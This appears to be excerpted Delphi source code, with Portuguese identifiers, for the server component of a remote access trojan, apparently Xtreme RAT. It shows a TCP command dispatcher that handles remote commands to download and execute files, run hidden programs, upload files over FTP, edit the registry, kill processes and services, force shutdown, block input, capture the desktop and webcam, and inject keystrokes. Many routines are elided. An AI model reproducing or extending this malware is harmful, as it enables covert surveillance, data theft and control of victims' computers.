...
var
  FS: StreamUnit.TFileStream;
begin
  result := true;
  try
    FS := StreamUnit.TFileStream.Create(Filename, fmCreate);
    except
    result := false;
  end;
  FreeAndNil(FS);
...
begin
  i := 0;
  TempStr := Str;
  if Pos(Delimitador, TempStr) <= 0 then exit;

  while (TempStr <> '') and (i <= NumeroDeVariaveis) do
  begin
    Result[i] := Copy(TempStr, 1, pos(Delimitador, TempStr) - 1);
    delete(TempStr, 1, pos(Delimitador, TempStr) - 1);
...
begin
  Command := PROCESS + '|' +
             CPUUSAGE + '|' +
             IntToStr(MyProcess) + '|' +
             FormatFloat('##,##0.00', GetCpuUsage(MyProcess)) + '|';
...
begin
  ...
  while (pos('|', Drives) > 0) and (TempStr = '') do
  begin
    TempStr := FileExistsOnComp(Copy(Drives, 1, pos('|', Drives) - 1), FileName, True);
    delete(drives, 1, pos('|', drives));
  end;
...
begin
  ...
  while pos('|', Drives) > 0 do
  begin
    if Option = 0 then InSearch := False else InSearch := True;
    TempStr := TempStr + DownloadAllFiles(Copy(Drives, 1, pos('|', Drives) - 1), Filter, True, InSearch);
    delete(drives, 1, pos('|', drives));
  end;
...
begin
  ...
  while pos(#13#10, sTotal) > 0 do
  begin
    TempStr := '';
    s := '';
    FileName := '';

    s := Copy(sTotal, 1, pos(#13#10, sTotal) - 1);
    Delete(sTotal, 1, pos(#13#10, sTotal) + 1);
...
var
  ...
  Recebido, TempStr, ToSend, TempStr1, TempStr2, TempStr3, TempStr4, TempStr5: Widestring;
...
begin
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = PING then
  begin
    ToSend := PONG + '|' + IntToStr(SecondsIdle) + '|' + ActiveCaption;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = DESINSTALAR then
  begin
    IniciarDesinstalacao := True;
  end else

  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = MAININFO then
  begin
    {$IFNDEF XTREMETRIAL}
    //MessageBoxW(0, pwchar('PrivateID: ' + PrivateID + #13#10 + 'Recebido: ' + Recebido), '', 0);
    if pos(PrivateID, Recebido) <= 0 then
    begin
      GlobalVars.MainIdTCPClient.Disconnect;
      Exit;
    end;
    {$ENDIF}
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = GETDESKTOPPREVIEW then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt2 := StrToInt(Copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = GETDESKTOPPREVIEWINFO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = RECONECTAR then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    ...
    ReconectarServerHost := Copy(TempStr, 1, pos(':', TempStr) - 1);
    delete(TempStr, 1, pos(':', TempStr));
    ReconectarServerPort := StrToInt(TempStr);
    DesconectarServidor := true;
  end else
  
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = RENOMEAR then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = CHANGEGROUP then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = UPDATESERVERLOCAL then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempStr := Recebido;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = CHANGESERVERSETTINGS then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    if copy(Recebido, 1, pos('|', Recebido) - 1) = 'Y' then TempBool := True else TempBool := False;
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = UPDATESERVERLINK then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = EXECCOMANDO then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = DOWNEXEC then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = OPENWEB then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1) = UPLOADANDEXECUTE then
  begin
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempStr := Recebido;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = GETPROCESSLIST then
  begin
    ToSend := PROCESS + '|' + GETPROCESSLIST + '|' + IntToStr(GetCurrentProcessId) + DelimitadorComandos + ProcessList;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = CPUUSAGE then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = KILLPROCESSID then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = SUSPENDPROCESSID then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = RESUMEPROCESSID then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTADEJANELAS then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    if copy(Recebido, 1, pos('|', Recebido) - 1) = 'T' then
    ToSend := JANELAS + '|' +
              LISTADEJANELAS + '|' +
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FECHARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = HABILITARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESABILITARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = OCULTARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOSTRARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MINIMIZARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MAXIMIZARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = RESTAURARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FINALIZARJANELA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MUDARCAPTION then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = CRAZYWINDOW then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTADESERVICOS then
  begin
    ToSend := SERVICOS + '|' +
              LISTADESERVICOS + '|' +
              ServiceList;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = PARARSERVICO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = INICIARSERVICO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempStr := copy(Recebido, 1, pos('|', Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = REMOVERSERVICO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempStr := copy(Recebido, 1, pos('|', Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = EDITARSERVICO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    Result := SplitString(Recebido, delimitadorComandos);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTADECHAVES then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTADEDADOS then
  begin
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = NOVOREGISTRO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    AdicionarDados(Recebido);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = NOVACHAVE then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    AdicionarChave(Recebido);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = APAGARREGISTRO then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    UnitRegedit.DeletarRegistro(Recebido);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = APAGARCHAVE then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    UnitRegedit.DeletarChave(Recebido);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = RENOMEARCHAVE then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    TempStr := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1);
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1);
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr2 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1);
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr3 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1);

    RenameRegistryItem(StrToHKEY(TempStr), TempStr1 + '\' + TempStr2, TempStr1 + '\' + TempStr3);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = RENOMEARREGISTRO then
  begin
    delete(Recebido, 1, pos('|', Recebido));

    TempStr := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); //HKEY
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); //SubKey
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr2 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); //KeyType
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr3 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); //OldName
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));

    TempStr4 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); //ValueData
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(delimitadorComandos));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = STARTUPMANAGER then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = SHELLSTART then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDRIVELIST then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMFOLDERLIST then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := copy(Recebido, 1, pos('|', Recebido) - 1);
    TempStr := ListarArquivos(TempStr);
    TempStr1 := Copy(TempStr, 1, pos(delimitadorComandos, Tempstr) - 1);
    delete(TempStr, 1, pos(delimitadorComandos, Tempstr) - 1);
    delete(TempStr, 1, length(delimitadorComandos));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMFOLDERLIST2 then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMRENOMEARPASTA then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMCRIARPASTA then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDELETARPASTA then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDELETARPASTALIXO then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // TTreeNode
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMEXECNORMAL then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    while Recebido <> '' do
    begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMEXECHIDE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    while Recebido <> '' do
    begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDELETARARQUIVO then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    while Recebido <> '' do
    begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDELETARARQUIVOLIXO then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    while Recebido <> '' do
    begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMEXECPARAM then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // Normal ou oculto
    Delete(Recebido, 1, pos('|', Recebido));

    TempStr := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); // arquivo
    delete(recebido, 1, pos(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); // parâmetro
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMEDITARARQUIVO then
  begin
    Delete(Recebido, 1, pos('|', Recebido));

    TempStr := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); // oldname
    delete(recebido, 1, pos(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    TempStr1 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); // newname
    delete(recebido, 1, pos(delimitadorComandos, recebido) - 1);
    delete(recebido, 1, length(delimitadorComandos));

    TempStr2 := copy(recebido, 1, pos(delimitadorComandos, recebido) - 1); // parâmetro
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMWALLPAPER then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    randomize;
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMTHUMBS then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    ThumbStop := true;
    sleep(100);
    ...
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // tamanho
    Delete(Recebido, 1, pos('|', Recebido));

    TempInt1 := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // qualidade
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMFILESEARCHLIST then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempBool := copy(Recebido, 1, pos('|', Recebido) - 1) = 'YES'; // recursive
    Delete(Recebido, 1, pos('|', Recebido));

    TempStr := copy(Recebido, 1, pos(delimitadorComandos, Recebido) - 1); // SelectedDir
    Delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    Delete(Recebido, 1, length(delimitadorComandos));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMFILESEARCHLISTSTOP then
  begin
    SearchFileStop := true;
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMTHUMBS_SEARCH then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMDOWNLOAD then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMRESUMEDOWNLOAD then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMUPLOAD then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempStr := Copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMSENDFTP then
  begin
    delete(Recebido, 1, pos('|', recebido));

    TempStr := copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1); // FTPAddress
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr1 := copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1); // FTPFolder
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr2 := copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1); // FTPUser
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr3 := copy(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1); // FTPPass
    delete(Recebido, 1, pos(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMTHUMBS2 then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1)); // tamanho
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = UnitConstantes.FILESEARCH then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTDEVICES then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTEXTRADEVICES then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempStr := ShowDeviceAdvancedInfo(strtoint(copy(Recebido, 1, pos('|', Recebido) - 1)));
    GlobalVars.MainIdTCPClient.EnviarString(LISTDEVICES + '|' +
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTARPORTASDNS then
  begin
    ReadTCPTable;
    ReadUdpTable;
  ...
  begin
    ...
    delete(Recebido, 1, pos('|', Recebido));
    tempstr2 := copy(Recebido, 1, pos('|', Recebido) - 1);

    delete(Recebido, 1, pos('|', Recebido));
    tempstr3 := copy(Recebido, 1, pos('|', Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = LISTADEPROGRAMAS then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESINSTALARPROGRAMA then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempStr := Recebido;
    ShellExecute(0,
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESINSTALARPROGRAMASILENT then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempStr := copy(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, pos(delimitadorComandos, Recebido) - 1);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FMESSAGE then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = FSHUTDOWN then
  begin
    WindowsExit(EWX_SHUTDOWN or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = FHIBERNAR then
  begin
    Hibernar(True, False, False);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = FLOGOFF then
  begin
    WindowsExit(EWX_LOGOFF or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = POWEROFF then
  begin
    WindowsExit(EWX_POWEROFF or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = FRESTART then
  begin
    WindowsExit(EWX_REBOOT or EWX_FORCE);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = FDESLMONITOR then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = BTN_START_HIDE then
  begin
    ShowStartButton(false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = BTN_START_SHOW then
  begin
    ShowStartButton(true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = BTN_START_BLOCK then
  begin
    EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0, 'Button', nil),false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = BTN_START_UNBLOCK then
  begin
    EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil),0, 'Button', nil),true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESK_ICO_HIDE then
  begin
    ShowDesktop(false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESK_ICO_SHOW then
  begin
    ShowDesktop(true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESK_ICO_BLOCK then
  begin
    EnableWindow(FindWindow('ProgMan', nil), false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESK_ICO_UNBLOCK then
  begin
    EnableWindow(FindWindow('ProgMan', nil), true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = TASK_BAR_HIDE then
  begin
    TaskBarHIDE(false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = TASK_BAR_SHOW then
  begin
    TaskBarHIDE(true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = TASK_BAR_BLOCK then
  begin
    EnableWindow(FindWindow('Shell_TrayWnd', nil), false);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = TASK_BAR_UNBLOCK then
  begin
    EnableWindow(FindWindow('Shell_TrayWnd', nil), true);
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSE_BLOCK then
  begin
    PostMessage(ServerObject.Handle, WM_MOUSESTOP, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSE_UNBLOCK then
  begin
    PostMessage(ServerObject.Handle, WM_MOUSESTART, 0, 0);
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSE_SWAP then
  begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = SYSTRAY_ICO_HIDE then
  begin
    TrayHIDE;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = SYSTRAY_ICO_SHOW then
  begin
    TraySHOW;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = OPENCD then
  begin
    AbrirCD;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else

  if copy(Recebido, 1, pos('|', Recebido) - 1) = CLOSECD then
  begin
    FecharCD;
    GlobalVars.MainIdTCPClient.EnviarString(FDIVERSOS + '|' + FDIVERSOS + '|');
  end else
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESKTOPCONFIG then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    DesktopQuality := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));
    DesktopX := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));
    DesktopY := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
    delete(Recebido, 1, pos('|', Recebido));
    DesktopInterval := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
  end else
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = TECLADOEXECUTAR then
  begin
    delete(Recebido, 1, pos('|', Recebido));
    while Recebido <> '' do
    begin
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = MOUSECLICK then
  begin
    Delete(Recebido, 1, pos('|', Recebido));

    Point.X := strtoint(copy(Recebido, 1, pos('|', Recebido) - 1));
    Delete(Recebido, 1, pos('|', Recebido));

    Point.Y := strtoint(copy(Recebido, 1, pos('|', Recebido) - 1));
    Delete(Recebido, 1, pos('|', Recebido));

    MouseButton := strtoint(copy(Recebido, 1, pos('|', Recebido) - 1));
    Delete(Recebido, 1, pos('|', Recebido));

    //ClientToScreen(strtoint(copy(Recebido, 1, pos('|', Recebido) - 1)), Point);
    ...
    delay := strtoint(copy(Recebido, 1, pos('|', Recebido) - 1));
    sleep(delay);
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = DESKTOPMOVEMOUSE then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
  ...
  if copy(Recebido, 1, pos('|', Recebido) - 1) = WEBCAMCONFIG then
  begin
    Delete(Recebido, 1, pos('|', Recebido));
    try
      WebcamQuality := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
      except
      WebcamQuality := 50;
    end;
    Delete(Recebido, 1, pos('|', Recebido));
    try
      WebcamInterval := StrToInt(copy(Recebido, 1, pos('|', Recebido) - 1));
      except
      WebcamInterval := 0;
    end;
  end else

